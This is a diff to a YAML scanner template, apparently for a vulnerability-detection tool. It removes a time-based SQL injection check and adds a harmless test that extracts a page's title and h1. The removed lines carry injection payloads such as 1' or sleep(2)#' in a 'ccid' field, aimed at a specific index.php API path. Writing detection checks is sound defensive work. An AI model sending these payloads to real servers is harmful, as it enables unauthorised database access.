@@ -1,61 +1,23 @@
 id: test
 
 info:
-  name: test
+  name: test yaml
   author: zan8in
   severity: info
 
-set:
-  host: request.url.host
 rules:
-  #   r0:
-  #     request:
-  #       method: POST
-  #       path: /index.php?a=api&m=openkqj|openapi&d=task&sn=1&/post
-  #       headers:
-  #         Content-Type: application/json
-  #       body: |
-  #         {"a":{"data":"fingerprint","ccid":"1'or sleep(4)#'","fingerprint":"3"}}
-  #     expression: |
-  #       response.body.bcontains(b'Undefined index:')
-  # expression: r0()
   r0:
     request:
-      raw: |-
-        POST /index.php?a=api&m=openkqj|openapi&d=task&sn=1&/post HTTP/1.1
-        Host: {{host}}
-        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
-        Content-Type: application/x-www-form-urlencoded
-
-        {"a":{"data":"fingerprint","ccid":"1' or sleep(2)#'","fingerprint":"3"}}
-    expression: |
-      response.status == 200 &&
-      response.latency <= 5000 &&
-      response.latency >= 4000
-expression: r0()
-#   r1:
-#     request:
-#       raw: |-
-#         POST /index.php?a=api&m=openkgilopenapi&d=task&sn=1&/post HTTP/1.1
-#         Host: {{host}}
-#         Content-Type: application/x-www-form-urlencoded
-
-#         {"a":{"data":"fingerprint","ccid":"1'or sleep(4)#'","fingerprint":"3"}}
-#     expression: |
-#       response.status == 200 &&
-#       response.latency <= 9000 &&
-#       response.latency >= 8000
-# expression: r0() && r1()
-#   r1:
-#     request:
-#       raw: |-
-#         POST /index.php?a=api&m=openkqj|openapi&d=task&sn=1&/post HTTP/1.1
-#         Host: {{host}}
-#         Content-Type: application/x-www-form-urlencoded
-
-#         a={"a":{"data":"fingerprint","ccid":"1' or sleep(4)#'","fingerprint":"3"}}
-#     expression: |
-#       response.status == 200 &&
-#       response.latency <= 9000 &&
-#       response.latency >= 8000
-# expression: r0() && r1()
+      method: GET
+      path: /
+    expression: true
+    output:
+      test: '"<title>(?P<title>.+)</title>(.*?)<h1>(?P<h1>.+)</h1>".bsubmatch(response.body)'
+  r1:
+    request:
+      method: POST
+      path: /title={{test['title']}}
+      headers:
+        "h1": "{{test['h1']}}"
+    expression: true
+expression: r0() && r1()
